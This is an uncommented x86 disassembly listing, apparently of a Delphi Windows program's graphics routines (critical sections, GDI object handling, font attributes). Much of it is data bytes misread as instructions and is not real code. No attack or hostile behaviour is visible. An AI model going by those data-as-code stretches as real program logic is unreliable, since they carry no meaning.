add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
popad
insd
push eax
inc [ ecx ]
add al 0x1d
inc edx
add [ ebx + 0x10042 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
adc [ eax ] al
in al dx
sbb eax [ edx ]
hlt
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + eax + 0x42 ] ah
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
inc eax
add [ eax ] ah
xor [ eax ] eax
mov [ eax ] ds
inc edx
add [ ebp + eax * 4 - 0x7a6bffbf ] cl
inc ecx
add al dl
sbb [ edx ] al
push cs
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
sbb al 0x20
imul esp [ ebx + 0x73 ] 0xfd740004
inc ecx
add al dh
push ds
inc edx
add al bh
push ds
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
push eax
outsb
lea eax [ eax ]
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] dh
inc edx
add [ eax + eax ] bl
add [ eax ] al
enter 0x4200 0x0
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
inc edx
add [ eax ] al
add [ esi ] cl
jo r-xdata
add [ eax ] al
jae r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax - 0x73ffbde3 ] ch
test [ ecx ] eax
xchg esp eax
test [ ecx ] eax
rcr [ 0x54040042 ] 0x1
shl [ ebx ] 0x40
add ah al
xor eax [ eax ]
enter 0x4033 0x0
inc edx
add [ eax ] ah
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x464c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] dh
inc edx
add [ eax ] bl
add [ eax ] al
add al cl
add [ edx ] al
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax - 0x73ffbde0 ] dl
test [ ecx ] eax
xchg esp eax
test [ ecx ] eax
mov eax 0x6004220
push esp
inc edx
jb r-xdata
inc [ ecx ]
sbb [ eax ] al
add bh bh
fcomp [ edi ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x2865646f ] al
inc [ ecx ]
in al dx
pop ds
inc edx
add ah dh
pop ds
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bl
jns r-xdata
jae r-xdata
add [ eax ] al
push eax
pop ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax + 0x42 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jl r-xdata
add al 0x24
retn
outsd
adc al 0x2
inc edx
add [ eax + eax ] cl
add bh bh
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] 0x0
int3
add eax 0x7070042
push esp
inc ebx
popad
outsb
jbe r-xdata
push esp
inc edx
jb r-xdata
inc edx
add [ edi ] al
push es
mov eax 0x11d4267a
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
add eax [ edx ]
adc [ eax ] al
add bh bh
cld
sub [ edx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add edx [ eax + 0x65 ]
outsb
mov eax eax
int3
in al dx
sub [ edx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x46
outsd
outsb
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x5 ] al
inc edx
add [ eax ] bl
jae r-xdata
add [ eax ] al
add eax 0x59c40042
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
dec esp
add eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x42
add [ eax ] bh
add [ edx ] eax
add al [ eax ]
or [ edi + 0x72 ] al
popad
jo r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add [ eax + 0x42050000 ] al
jb r-xdata
imul esp [ ebx + 0x73 ] 0x4780004
inc edx
add [ eax + eax ] dl
add bh bh
or [ ecx ] ch
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc eax
add eax r--data
imul esp [ ebx + 0x73 ] 0xfd740002
inc ecx
add al dh
and [ edx ] eax
clc
and [ edx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xffffff ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esp ] cl
inc edx
add [ ebp + eax * 4 - 0x7a6bffbf ] cl
inc ecx
add [ eax + 0x4c004184 ] ch
sub eax [ edx ]
cmp [ ebx ] ch
inc edx
add [ edx + ebp + 0x42 ] ch
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ edx ] al
or al 0x23
inc edx
add [ ebx ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
sub [ 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_420664
push es
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
pop es
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
pop es
inc edx
add [ eax ] bl
pop es
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x5a ] al
inc ecx
add [ ebx + esi - 0x79b3ffc0 ] dh
inc ecx
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esp + eax * 4 + 0x41 ] bh
add [ ebp + eax * 4 + 0x40100041 ] cl
inc edx
add [ eax - 0x23ffbe7c ] ch
xchg [ ecx ] al
mov al [ 0x6c00423f ]
sub [ eax ] eax
pop esp
inc eax
inc edx
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + eax * 2 + 0x41a80042 ] ah
inc edx
add [ ecx + ebp + 0x40 ] ch
add [ eax ] ch
inc edx
inc edx
add [ ecx + ebp + 0x40 ] ch
add [ edx + eax * 2 + 0x42900042 ] cl
inc edx
add [ ecx + ebp + 0x40 ] ch
add [ eax + 0x68004242 ] ah
aas
inc edx
add [ ecx + eax * 2 + 0x42340042 ] ch
inc edx
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx ] al
add ch bh
inc [ eax ]
inc edx
inc edx
add [ eax ] cl
push esp
inc edi
jb r-xdata
pop ecx
pop es
inc edx
add [ edi + 0x7 ] ah
inc edx
add [ ecx + 0x7 ] dh
jo r-xdata
inc edx
add [ ecx + 0x7 ] cl
inc edx
add [ ecx + 0x7 ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
pop es
imul esp [ ebx - 0x73 ] 0x7280040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx - 0x54 ] 0xc4004206
pop edx
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
inc eax
pop edx
inc ecx
add [ ebx + esi - 0x79b3ffc0 ] dh
inc ecx
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax + ecx * 2 ] bl
inc edx
add [ eax + ecx * 2 + 0x42 ] cl
add [ ebp + ecx * 2 + 0x42 ] bh
add ah ah
dec edx
inc edx
add ah bl
xchg [ ecx ] al
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + eax + 0x42 ] ah
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add ch bh
inc edx
add [ eax + 0x8 ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
or [ edx ] al
xor [ eax ] cl
inc edx
add [ eax + eax ] ch
sbb edx 0x0
aam 0x11
ror [ edi + 0x60 ] 0xb2
fnstsw [ esi + 0x7 ]
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x420800c0 ] cl
jo r-xdata
add [ edx + 0x4207 ] dl
add [ eax ] al
add [ eax ] dl
or [ edx ] al
inc eax
or [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and cl [ eax ]
inc edx
add [ eax ] dh
or [ edx ] al
sub al 0x0
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
add [ eax ] cl
inc edx
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp r-xdata
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4248e4
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_420826
cld
inc [ eax + 0x4b ]
inc edx
add [ ebx + ecx * 2 + 0x42 ] ah
add [ eax ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add [ eax + 0x8 ] al
inc edx
add [ edi ] al
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
add [ gs : eax ] cl
inc edx
add ah al
pop edx
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
lea eax [ bx + si ]
or al 0x9
jo r-xdata
add ah bl
imul bp [ ebp + 0x49 ] 0x616d
nop
insb
or [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
or [ edx ] eax
and al 0x0
add [ eax ] al
pushad
or [ edx ] al
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add al bh
dec ebp
inc edx
add [ esi + ecx * 2 ] dh
inc edx
add [ esi ] cl
push esp
dec ebp
je r-xdata
imul esp [ ebx + 0x73 ] 0xac900000
or [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x8
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x4bffbff0 ] dh
xor eax [ eax ]
shl [ ebx ] 0x40
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ecx + ebp + 0x40 ] ch
add [ esp + edx * 2 ] cl
push ebx
push 0x64657261
dec ecx
add al cl
xor eax [ eax ]
imul bp [ ebp - 0x75 ] 0xe0c0
or [ edx ] eax
pop es
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
xchg [ ecx ] al
mov al [ 0x4400423f ]
dec edi
inc edx
add [ eax + eax * 2 + 0x42 ] bl
add ah dl
dec edi
inc edx
add ah bl
dec edi
inc edx
add [ eax + 0x50 ] al
inc edx
add [ eax - 0x33ffbdbf ] ch
push eax
inc edx
add [ ecx + edx * 2 + 0x55480042 ] ch
inc edx
add [ edx + eax * 2 + 0x56340042 ] cl
inc edx
add [ eax ] bh
push esi
inc edx
add [ eax + 0x38004257 ] dl
dec esi
inc edx
add [ ecx + eax * 2 + 0x54680042 ] ch
inc edx
add [ eax ] dh
push ecx
inc edx
add [ edx * 2 + 0x59e40042 ] ch
inc edx
add [ eax + 0x5a ] ch
inc edx
add [ ecx ] cl
push esp
dec ebp
je r-xdata
add [ eax ] al
add [ eax ] al
add al dl
or [ edx ] eax
xor [ eax ] al
add [ eax ] al
pushad
push es
inc edx
add [ ebx + esi - 0x79b3ffc0 ] dh
inc ecx
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax - 0x73ffbdb2 ] al
test [ ecx ] eax
adc [ eax + 0x42 ] al
add [ eax - 0x23ffbdb2 ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x420aac70
add [ edi + eax ] ah
inc edx
add ah dh
imul eax [ edx ] 0x5c
inc eax
inc edx
add [ eax + 0x5c00426e ] ch
outsd
inc edx
add [ edi + ebp * 2 + 0x41a80042 ] bl
inc edx
add al bh
outsd
inc edx
add ah ah
jae r-xdata
js r-xdata
imul bp [ ebp + 0x6c ] 0x4209
add [ edi + eax ] ah
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
nop
jo r-xdata
insd
popad
jo r-xdata
add al ah
jpo r-xdata
add [ eax - 0x23ffbd97 ] ah
xchg [ ecx ] al
je r-xdata
imul eax [ fs : edx ] sub_41858c
adc [ eax + 0x42 ] al
inc edx
add ah dl
pop esi
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
lodsb [ esi ]
or al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebx ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx ] bl
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc ] ah
inc edx
imul esp [ ebx + 0x73 ] 0xc08b0000
xchg esp eax
or eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
or eax [ edx ]
sbb [ eax ] al
add [ eax ] al
pushad
or [ edx ] al
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + eax * 4 - 0x7e3bffbe ] dl
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1800420b ] bl
add [ eax ] al
add [ eax + 0x8 ] ah
inc edx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
or eax [ edx ]
pop es
add [ esp + edi * 2 + 0x42900042 ] dh
inc edx
add al bl
jge r-xdata
inc edx
add [ eax + eax ] bh
add [ eax ] al
pushad
push es
inc edx
add [ ebx + esi - 0x79b3ffc0 ] dh
inc ecx
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + ebp * 2 + 0x42 ] ah
add [ ebp + eax * 4 + 0x40100041 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
or eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xb
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax + 0x5e ] bh
imul esp [ ebx + 0x73 ] 0xa4c0000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] dl
inc edx
add [ eax + eax ] dh
add [ eax + 0x8 ] ah
inc edx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx + 0x42 ] dl
add [ eax + eax ] dh
add [ eax ] al
pushad
push es
inc edx
add [ ebx + esi - 0x79b3ffc0 ] dh
inc ecx
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] dh
add [ edx ] 0x8c
test [ ecx ] eax
adc [ eax + 0x42 ] al
add [ eax - 0x7e ] ah
inc edx
add ah bl
xchg [ ecx ] al
mov al [ 0xffffffffc000423f ]
add [ edx ] 0x5c
inc eax
inc edx
add [ eax ] al
add [ edx ] 0x2c
add [ edx ] 0xffffffa4
inc ecx
inc edx
add [ eax + 0x40004241 ] ch
add [ edx ] 0x28
inc edx
inc edx
add ah al
test [ edx ] eax
mov [ edx + 0x42 ] es
add ah bl
test [ edx ] eax
loopne r-xdata
inc edx
add [ eax - 0x23ffbdbe ] ah
add [ edx ] sub_4241ac
xor al 0x42
inc edx
add [ eax - 0x7ffbd7c ] al
test [ edx ] eax
and [ esi - 0x79cbffbe ] al
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
pushad
or al 0x42
add [ edi ] al
add eax 0x6f634954
outsb
inc edx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
lodsb [ esi ]
or al [ edx ]
and al 0x7
add [ esi + edi * 2 ] ch
inc edx
add ah bh
push 0x41ac0042
inc edx
add [ edx + eax * 2 ] dh
inc edx
add al al
jb r-xdata
add [ ebx + 0x420b94c0 ] cl
add [ eax ] al
add ah ch
add [ edx ] 0x3c
jb r-xdata
add ah dh
add [ edx ] 0xc
outsd
inc edx
add [ edi + ebp * 2 + 0x42 ] ch
add [ eax + 0x700427a ] ch
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x420b2870
add [ edi ] al
sub_420c90
fmul [ edx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
or al 0x42
add [ eax + eax ] ah
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax + 0xd ] al
inc edx
add [ eax ] dl
push esp
push edx
jae r-xdata
push esp
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_420d04
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_420d40
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_420d7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_420cf0
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_420d64
xor edx edx
push ebp
push sub_420e50
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420e57
mov eax [ ebp - 0x4 ]
call sub_420d70
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026dc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407f78
test al al
je r-xdata
sub_420e60
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_420d64
xor ecx ecx
push ebp
push sub_420ee7
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_420d70
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_420f10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_420d64
xor eax eax
push ebp
push sub_420f79
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420d7c
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_420e60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420f80
mov eax [ ebp - 0x4 ]
call sub_420d70
retn
mov eax ebx
mov si 0xfffd
call sub_403368
sub_420f88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_420d64
xor eax eax
push ebp
push sub_420fe4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420feb
mov eax [ ebp - 0x4 ]
call sub_420d70
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403368
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_420e60
sub_420ff4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_420d64
xor edx edx
push ebp
push sub_421053
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42105a
mov eax [ ebp - 0x4 ]
call sub_420d70
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_421060
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418258
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4210fd
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417e94
mov ebx eax
mov eax ebx
call sub_422644
inc [ ebp - 0x4 ]
mov eax ebx
call sub_422a10
mov eax [ rw-data ]
call sub_420ff4
mov eax [ rw-data ]
call sub_420ff4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421104
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_4182bc
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417e94
call sub_4228c4
inc esi
dec ebx
jne r-xdata
sub_421753
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_417944
retn
sub_421784
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
